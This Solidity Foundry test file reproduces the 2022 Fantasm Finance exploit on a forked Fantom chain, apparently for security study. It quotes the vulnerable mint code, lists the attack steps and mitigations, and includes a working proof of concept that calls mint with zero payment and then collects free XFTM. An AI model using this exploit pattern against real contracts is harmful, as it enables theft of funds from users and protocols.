// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {IERC20} from "../interfaces/IERC20.sol";

import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';

// forge test --match-contract Exploit_FantasmFinance -vvv
/*
On Mar 09, 2022 an attacker stole ~$2.62MM in XFTM tokens from an Fantasm Finance collateral reserve.
The attacker managed to exploit the mint function supplying only FSM without transferring the FTM.
This was possible because the mint function did not check the counterpart required in FTM as payment.

// Attack Overview
Total Lost:  ~$2.62MM in XFTM
Attack Tx: https://ftmscan.com/tx/0x0c850bd8b8a8f4eb3f3a0298201499f794e0bfa772f620d862b13f0a44eadb82
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/fantom/0x0c850bd8b8a8f4eb3f3a0298201499f794e0bfa772f620d862b13f0a44eadb82

Exploited Contract: 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156
Attacker Address: https://ftmscan.com/address/0x47091e015b294b935babda2d28ad44e3ab07ae8d
Attacker Contract: https://ftmscan.com/address/0x944b58c9b3b49487005cead0ac5d71c857749e3e
Attack Block: 32968740 

// Key Info Sources
Twitter: https://twitter.com/fantasm_finance/status/1501569232881995785
Writeup: https://www.certik.com/resources/blog/5p92144WQ44Ytm1AL4Jt9X-fantasm-finance
Article: https://www.coindesk.com/tech/2022/03/10/fantom-based-algo-protocol-fantasm-exploited-for-26m/
Code: https://ftmscan.com/address/0x880672ab1d46d987e5d663fc7476cd8df3c9f937#code#F11#L151


Principle: Unchecked payment amount for minted tokens.

    function mint(uint256 _fantasmIn, uint256 _minXftmOut) external payable nonReentrant {
        require(!mintPaused, "Pool::mint: Minting is paused");
        uint256 _ftmIn = msg.value;
        address _minter = msg.sender;

        (uint256 _xftmOut, , uint256 _minFantasmIn, uint256 _ftmFee) = calcMint(_ftmIn, _fantasmIn);
        require(_minXftmOut <= _xftmOut, "Pool::mint: slippage");
        require(_minFantasmIn <= _fantasmIn, "Pool::mint: Not enough Fantasm input");
        require(maxXftmSupply >= xftm.totalSupply() + _xftmOut, "Pool::mint: > Xftm supply limit");

        WethUtils.wrap(_ftmIn);
        userInfo[_minter].lastAction = block.number;

        if (_xftmOut > 0) {
            userInfo[_minter].xftmBalance = userInfo[_minter].xftmBalance + _xftmOut;
            unclaimedXftm = unclaimedXftm + _xftmOut;
        }

        if (_minFantasmIn > 0) {
            fantasm.safeTransferFrom(_minter, address(this), _minFantasmIn);
            fantasm.burn(_minFantasmIn);
        }

        if (_ftmFee > 0) {
            WethUtils.transfer(feeReserve, _ftmFee);
        }
        
        emit Mint(_minter, _xftmOut, _ftmIn, _fantasmIn, _ftmFee);
    }

    function calcMint(uint256 _ftmIn, uint256 _fantasmIn)
        public
        view
        returns (
            uint256 _xftmOut,
            uint256 _minFtmIn,
            uint256 _minFantasmIn,
            uint256 _fee
        )
    {
        uint256 _fantasmPrice = oracle.getFantasmPrice();
        require(_fantasmPrice > 0, "Pool::calcMint: Invalid Fantasm price");

        if (collateralRatio == COLLATERAL_RATIO_MAX || (collateralRatio > 0 && _ftmIn > 0)) {
            _minFtmIn = _ftmIn;
            _minFantasmIn = (_ftmIn * (COLLATERAL_RATIO_MAX - collateralRatio) * PRICE_PRECISION) / collateralRatio / _fantasmPrice;
            _xftmOut = (_ftmIn * COLLATERAL_RATIO_MAX * (PRECISION - mintingFee)) / collateralRatio / PRECISION;
            _fee = (_ftmIn * mintingFee) / PRECISION;
        } else {
            _minFantasmIn = _fantasmIn;
            _xftmOut = (_fantasmIn * _fantasmPrice * COLLATERAL_RATIO_MAX * (PRECISION - mintingFee)) / PRECISION / (COLLATERAL_RATIO_MAX - collateralRatio) / PRICE_PRECISION;
            _minFtmIn = (_fantasmIn * _fantasmPrice * collateralRatio) / (COLLATERAL_RATIO_MAX - collateralRatio) / PRICE_PRECISION;
            _fee = (_fantasmIn * _fantasmPrice * collateralRatio * mintingFee) / PRECISION / (COLLATERAL_RATIO_MAX - collateralRatio) / PRICE_PRECISION;
        }
    }
    
ATTACK:
0) Deploy a contract the performed the following actions:
1) The attacker minted XFTM with pool.mint{value: 0}(someFSM, 0) 
2) Collected the XFTMs
3) Swapped XFTMs to FTM
4) Back to step 1.

This was possible because the _minFtmIn return of calcMint() (minimum amount of FTM in required) was not consumed by the mint() function:
    (uint256 _xftmOut, SHOULD BE HERE , uint256 _minFantasmIn, uint256 _ftmFee) = calcMint(_ftmIn, _fantasmIn);

Essentially, minting tokens for free. 

MITIGATIONS:
1) If tokens are minted in exchange of a counterpart, check that the counterpart is sucessfully transferred to the contract (applies for any type of token).
2) Also, avoid using variable names with such resemblance...

*/
interface IFantasm {
    function mint(uint256 _fantasmIn, uint256 _minXftmOut) external payable;
    function collect() external;
}


contract Exploit_FantasmFinance is TestHarness, TokenBalanceTracker {

    IERC20 fsm = IERC20(0xaa621D2002b5a6275EF62d7a065A865167914801);
    IERC20 xFTM = IERC20(0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F);
    IFantasm fantasmPool = IFantasm(payable(0x880672AB1d46D987E5d663Fc7476CD8df3C9f937));

    address internal constant FANTOM_DEPLOYER = 0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400;
    uint256 internal constant ATTACKER_INITIAL_BALANCE = 282788864964253879669;
    
    function setUp() external {
        cheat.createSelectFork("fantom", 32972106);

        cheat.prank(FANTOM_DEPLOYER); // Simulating initial attacker's balance
        fsm.transfer(address(this), ATTACKER_INITIAL_BALANCE); // https://ftmscan.com/tx/0xdfe2357a2105acaf36ffb54f1973d33460fa9160f8c4b12453bd1c5bcdab9560
        require(fsm.balanceOf(address(this)) == ATTACKER_INITIAL_BALANCE, "wrong initial balance");

        addTokenToTracker(address(fsm));
        addTokenToTracker(address(xFTM));

        console.log("Before exploit");
        updateBalanceTracker(address(this));
        updateBalanceTracker(address(fantasmPool));

        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Pool', address(fantasmPool));
    }

    function test_attack() external {
        fsm.approve(address(fantasmPool), type(uint256).max); 
        fantasmPool.mint{value: 0}(fsm.balanceOf(address(this)), 0); // Passing 0 as _minXftmOut, msg.value == 0; https://tx.eth.samczsun.com/fantom/0x0c850bd8b8a8f4eb3f3a0298201499f794e0bfa772f620d862b13f0a44eadb82
        cheat.roll(32972130); // Jump one block before collection
        fantasmPool.collect(); // Collect tx https://ftmscan.com/tx/0x956e760143d3a029ae44fa2b60e8a7613ed937374b7e473109e3193e466f523a
        
        console.log("After exploit");
        logBalancesWithLabel('Attacker', address(this));
        logBalancesWithLabel('Pool', address(fantasmPool));
    }
   
}